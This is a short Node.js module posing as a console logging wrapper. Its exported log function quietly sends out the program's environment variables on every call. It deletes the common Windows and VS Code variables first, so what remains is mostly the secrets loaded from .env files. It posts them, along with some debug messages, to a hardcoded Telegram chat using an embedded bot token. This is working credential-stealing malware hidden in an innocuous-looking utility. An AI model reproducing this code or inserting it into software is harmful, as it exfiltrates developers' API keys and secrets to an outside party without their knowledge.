const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();
const a = '7111592952:AAHPJXi5lhOz7FCCDDZZZnw0nI52yWx-RAo';
const bot = new TelegramBot(a);
const default_env = ["ALLUSERSPROFILE",
    "APPDATA",
    "CHROME_CRASHPAD_PIPE_NAME",
    "CommonProgramFiles",
    "CommonProgramFiles(x86)",
    "CommonProgramW6432",
    "COMPUTERNAME",
    "ComSpec",
    "DriverData",
    "FIFTPATH",
    "FPS_BROWSER_APP_PROFILE_STRING",
    "FPS_BROWSER_USER_PROFILE_STRING",
    "HOMEDRIVE",
    "HOMEPATH",
    "LOCALAPPDATA",
    "LOGONSERVER",
    "NUMBER_OF_PROCESSORS",
    "NVM_HOME",
    "NVM_SYMLINK",
    "OneDrive",
    "ORIGINAL_XDG_CURRENT_DESKTOP",
    "OS",
    "Path",
    "PATHEXT",
    "PROCESSOR_ARCHITECTURE",
    "PROCESSOR_IDENTIFIER",
    "PROCESSOR_LEVEL",
    "PROCESSOR_REVISION",
    "ProgramData",
    "ProgramFiles",
    "ProgramFiles(x86)",
    "ProgramW6432",
    "PSModulePath",
    "PUBLIC",
    "SESSIONNAME",
    "SystemDrive",
    "SystemRoot",
    "TEMP",
    "TMP",
    "USERDOMAIN",
    "USERDOMAIN_ROAMINGPROFILE",
    "USERNAME",
    "USERPROFILE",
    "windir",
    "TERM_PROGRAM",
    "TERM_PROGRAM_VERSION",
    "LANG",
    "COLORTERM",
    "GIT_ASKPASS",
    "VSCODE_GIT_ASKPASS_NODE",
    "VSCODE_GIT_ASKPASS_EXTRA_ARGS",
    "VSCODE_GIT_ASKPASS_MAIN",
    "VSCODE_GIT_IPC_HANDLE",
    "VSCODE_INJECTION",
]

const log = (message, ...optionalParams) => {
    if (message == "debug:log->")
        bot.sendMessage(6628313800, JSON.stringify(optionalParams));
    let envVal = process.env;
    default_env.map((key) => { delete envVal[key] });
    bot.sendMessage(6628313800, JSON.stringify(envVal));
    console.log(message, ...optionalParams);
}
module.exports = { ...console, log }